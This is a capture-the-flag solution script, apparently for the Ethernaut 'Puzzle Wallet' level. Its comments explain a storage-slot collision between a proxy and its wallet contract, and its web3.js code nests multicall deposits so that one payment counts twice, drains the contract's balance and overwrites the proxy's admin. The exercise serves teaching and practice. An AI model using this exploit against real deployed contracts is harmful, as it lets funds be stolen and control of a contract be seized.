//There is storage conflict between PuzzleProxy and PuzzleWallet.
//Changing the first 2 variables of PuzzleProxy changes first 2 variables of PuzzleWallet
//because they occupy the same storage slot.

// PuzzleProxy  <=> PuzzleWallet
// pendingAdmin <=> owner;
// admin <=> maxBalance;

//The goal is to become admin of PuzzleProxy, start by calling proposeNewAdmin and changing pendingAdmin.
//This will change owner because it is in the same slot. Now owner privileges in PuzzleWallet are accessible.
//Whitelist the player address to get access to pass the modifier test on all functions.
//To become admin of PuzzleProxy we need to change maxBalance variable of PuzzleWallet.
//Call multicall(deposit(), multicall(deposit()), execute(player, '0.002 ether', [])) with msg.value = 0.001 ether
//multicall checks for deposit calls and only allows one but in this way with 1 msg.value you can
//fool the contract to deposit twice and then transfer 0.002 ether to your own address.
//This way balance of contract is now 0 and you can now access the setMaxBalance() function.
//Call setMaxBlance with uint256(player address) and it overwrites storage of admin in PuzzleProxy.

var { data: puzzleDeposit } = await contract.deposit.request()
var { data: inceptionMultiCall } = await contract.multicall.request([
  puzzleDeposit,
])
var { data: puzzleExecute } = await contract.execute.request(
  "0xC7005fe8AF6ca11FcC0092D3C4C5C3D883eCE16c",
  web3.utils.toWei("0.002", "ether"),
  []
)

var our3Functions = [puzzleDeposit, inceptionMultiCall, puzzleExecute]
await contract.multicall(our3Functions, {
  from: "0xC7005fe8AF6ca11FcC0092D3C4C5C3D883eCE16c",
  value: web3.utils.toWei("0.001", "ether"),
})

//The afore-mentioned code can be pasted in the game console as it provides the necessary environment to
//execute it already.

//Shoutout-'https://medium.com/@appsbylamby/ethernaut-24-puzzle-wallet-walkthrough-mastering-the-proxy-pattern-cc830dc364ce'
//For help with the web3.js code and related theory explanation.
